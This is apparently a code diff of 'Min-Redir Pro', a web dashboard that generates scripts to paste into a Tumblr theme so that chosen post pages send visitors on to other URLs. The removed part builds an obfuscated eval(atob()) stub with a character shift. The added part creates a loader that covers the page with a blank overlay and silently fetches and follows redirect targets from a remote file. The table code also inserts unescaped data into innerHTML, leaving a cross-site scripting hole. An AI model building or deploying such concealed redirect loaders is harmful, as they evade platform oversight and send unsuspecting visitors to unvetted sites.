@@ -3,58 +3,369 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Min-Redir Pro</title>
+    <title>Min-Redir Pro Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
-        :root { --p: #6366f1; --bg: #050505; --c: #111; --t: #fff; }
-        body { background: var(--bg); color: var(--t); font-family: 'Inter', sans-serif; display: grid; place-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .box { width: 100%; max-width: 440px; background: var(--c); padding: 2rem; border-radius: 16px; border: 1px solid #222; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
-        h1 { font-size: 1.1rem; margin: 0 0 1.5rem; letter-spacing: 1px; color: var(--p); text-transform: uppercase; text-align: center; }
-        label { display: block; font-size: 0.75rem; color: #666; margin-bottom: 0.5rem; font-weight: 600; }
-        textarea, input { width: 100%; background: #000; border: 1px solid #222; color: #fff; padding: 12px; margin-bottom: 1.2rem; border-radius: 8px; box-sizing: border-box; font-family: monospace; outline: none; transition: border-color 0.2s; }
-        textarea:focus, input:focus { border-color: var(--p); }
-        button { width: 100%; background: var(--p); color: #fff; border: 0; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; transition: opacity 0.2s; }
-        button:hover { opacity: 0.9; }
-        #o { margin-top: 1.5rem; display: none; background: #000; padding: 15px; font-family: monospace; font-size: 11px; word-break: break-all; border: 1px solid #222; border-radius: 8px; position: relative; }
-        #o::before { content: 'GENERATED SCRIPT'; display: block; color: #444; margin-bottom: 8px; font-size: 9px; }
-        .copy { position: absolute; top: 10px; right: 10px; font-size: 9px; color: var(--p); cursor: pointer; }
+        :root {
+            --primary: #6366f1;
+            --primary-hover: #4f46e5;
+            --bg: #0b0f19;
+            --card-bg: #111827;
+            --border: #1f2937;
+            --text: #f3f4f6;
+            --text-dim: #9ca3af;
+            --accent: #818cf8;
+            --danger: #ef4444;
+        }
+
+        * { box-sizing: border-box; }
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Outfit', sans-serif;
+            margin: 0;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        header h1 {
+            font-size: 2.5rem;
+            margin: 0;
+            background: linear-gradient(135deg, #fff 0%, var(--primary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+
+        header p {
+            color: var(--text-dim);
+            font-size: 0.9rem;
+            margin-top: 8px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+
+        .section-title {
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .section-title span {
+            width: 20px;
+            height: 1px;
+            background: var(--accent);
+            opacity: 0.3;
+        }
+
+        /* Script Area */
+        .script-box {
+            background: #000;
+            border-radius: 12px;
+            padding: 16px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: #10b981;
+            word-break: break-all;
+            border: 1px solid #222;
+            position: relative;
+            margin-top: 12px;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .copy-btn:hover { background: var(--primary-hover); transform: translateY(-1px); }
+
+        /* Table */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+
+        th {
+            text-align: left;
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            padding: 12px 8px;
+            border-bottom: 1px solid var(--border);
+            text-transform: uppercase;
+        }
+
+        td {
+            padding: 14px 8px;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.9rem;
+        }
+
+        .id-cell { font-family: 'JetBrains Mono', monospace; color: var(--accent); }
+        .url-cell { color: var(--text-dim); font-size: 0.85rem; }
+
+        .btn-delete {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+        }
+
+        .btn-delete:hover { background: var(--danger); color: white; }
+
+        /* Form */
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1.5fr auto;
+            gap: 12px;
+            align-items: end;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            background: #000;
+            border: 1px solid var(--border);
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus { border-color: var(--primary); }
+
+        .btn-add {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-add:hover { background: var(--primary-hover); }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-dim);
+            font-style: italic;
+            font-size: 0.9rem;
+        }
+
+        /* Animations */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .card { animation: fadeIn 0.4s ease forwards; }
+        .card:nth-child(2) { animation-delay: 0.1s; }
+        .card:nth-child(3) { animation-delay: 0.2s; }
+
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>Min-Redir Pro</h1>
-        <label>SHIFT KEY (1-9)</label>
-        <input id="k" type="number" value="5" min="1" max="9">
-        <label>MAPPINGS (POST_ID,TARGET_URL)</label>
-        <textarea id="m" placeholder="72608581021,https://site.com" rows="6"></textarea>
-        <button onclick="g()">GENERATE MINIMAL SCRIPT</button>
-        <div id="o"><span class="copy" onclick="cp()">COPY</span><code id="res"></code></div>
-    </div>
-    <script>
-        const $ = i => document.getElementById(i);
-        function g() {
-            const k = parseInt($('k').value) || 5;
-            const m = $('m').value.split('\n').reduce((a, l) => {
-                const [i, u] = l.split(',');
-                if (i && u) a[i.trim()] = u.trim();
-                return a;
-            }, {});
-            
-            if (!Object.keys(m).length) return alert('Error');
 
-            // Perfect & Mobile-Robust Payload
-            const p = `m=${JSON.stringify(m)};u=m[location.href.match(/\\d{10,}/)];u&&location.replace(u)`;
-            
-            // Perfect & Shortest Stub
-            const enc = btoa(p.split('').map(c => String.fromCharCode(c.charCodeAt(0) + k)).join(''));
-            const stub = `<script>eval(atob("${enc}").replace(/./g,c=>String.fromCharCode(c.charCodeAt()-${k})))<\/script>`;
-            
-            $('res').innerText = stub;
-            $('o').style.display = 'block';
+    <div class="container">
+        <header>
+            <h1>Min-Redir Pro</h1>
+            <p>Smart Redirect Dashboard for Tumblr</p>
+        </header>
+
+        <!-- SECTION 1: INSTALLATION -->
+        <div class="card">
+            <div class="section-title"><span></span>Installation Script (Copy Once)</div>
+            <p style="font-size: 0.85rem; color: var(--text-dim); margin: 0 0 16px;">Paste this script into your Tumblr theme's <code>&lt;head&gt;</code> section. It will automatically fetch your redirects.</p>
+            <div class="script-box">
+                <button class="copy-btn" onclick="copyScript()">Copy</button>
+                <code id="installScript"></code>
+            </div>
+        </div>
+
+        <!-- SECTION 2: REDIRECT PANEL -->
+        <div class="card">
+            <div class="section-title"><span></span>Auto-Updating Redirect Panel</div>
+            <div id="panelContent">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Tumblr Post ID</th>
+                            <th>Destination URL</th>
+                            <th style="width: 50px;"></th>
+                        </tr>
+                    </thead>
+                    <tbody id="redirectList">
+                        <!-- Items injected here -->
+                    </tbody>
+                </table>
+                <div id="emptyState" class="empty-state" style="display: none;">No redirects found. Add one below.</div>
+            </div>
+        </div>
+
+        <!-- SECTION 3: ADD NEW -->
+        <div class="card">
+            <div class="section-title"><span></span>Add New Redirect</div>
+            <div class="form-grid">
+                <div class="input-group">
+                    <label>Post ID</label>
+                    <input type="text" id="newId" placeholder="e.g. 72608581021">
+                </div>
+                <div class="input-group">
+                    <label>Destination URL</label>
+                    <input type="text" id="newUrl" placeholder="https://example.com/target">
+                </div>
+                <button class="btn-add" onclick="addRedirect()">Add Mapping</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let mappings = {};
+
+        async function loadData() {
+            try {
+                const res = await fetch('api.php?action=load');
+                mappings = await res.json();
+                renderTable();
+                updateScript();
+            } catch (e) {
+                console.error('Failed to load data', e);
+            }
         }
-        function cp() {
-            navigator.clipboard.writeText($('res').innerText);
-            document.querySelector('.copy').innerText = 'Done';
+
+        async function saveData() {
+            try {
+                await fetch('api.php?action=save', {
+                    method: 'POST',
+                    body: JSON.stringify(mappings)
+                });
+                renderTable();
+            } catch (e) {
+                alert('Failed to save data');
+            }
         }
+
+        function renderTable() {
+            const list = document.getElementById('redirectList');
+            const empty = document.getElementById('emptyState');
+            list.innerHTML = '';
+            
+            const keys = Object.keys(mappings);
+            if (keys.length === 0) {
+                empty.style.display = 'block';
+            } else {
+                empty.style.display = 'none';
+                keys.forEach(id => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td class="id-cell">${id}</td>
+                        <td class="url-cell">${mappings[id]}</td>
+                        <td><button class="btn-delete" onclick="deleteRedirect('${id}')">Delete</button></td>
+                    `;
+                    list.appendChild(row);
+                });
+            }
+        }
+
+        function updateScript() {
+            const baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
+            const apiUrl = baseUrl + 'data.json';
+            
+            // Generate a lightweight, obfuscated-looking loader
+            const payload = `<script>(function(){var d=document,b=d.createElement('div');b.style='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999999;display:flex;align-items:center;justify-content:center;';b.innerText='Loading...';d.documentElement.appendChild(b);fetch('${apiUrl}').then(r=>r.json()).then(m=>{var u=m[location.href.match(/\\d{10,}/)];if(u)location.replace(u);else b.remove();}).catch(()=>b.remove())})()<\/script>`;
+            
+            document.getElementById('installScript').innerText = payload;
+        }
+
+        function addRedirect() {
+            const id = document.getElementById('newId').value.trim();
+            const url = document.getElementById('newUrl').value.trim();
+            
+            if (!id || !url) return alert('Please fill both fields');
+            if (!url.startsWith('http')) return alert('URL must start with http:// or https://');
+            
+            mappings[id] = url;
+            document.getElementById('newId').value = '';
+            document.getElementById('newUrl').value = '';
+            saveData();
+        }
+
+        function deleteRedirect(id) {
+            if (confirm('Delete this redirect?')) {
+                delete mappings[id];
+                saveData();
+            }
+        }
+
+        function copyScript() {
+            const text = document.getElementById('installScript').innerText;
+            navigator.clipboard.writeText(text);
+            const btn = document.querySelector('.copy-btn');
+            btn.innerText = 'Copied!';
+            setTimeout(() => btn.innerText = 'Copy', 2000);
+        }
+
+        // Initialize
+        loadData();
     </script>
 </body>
 </html>
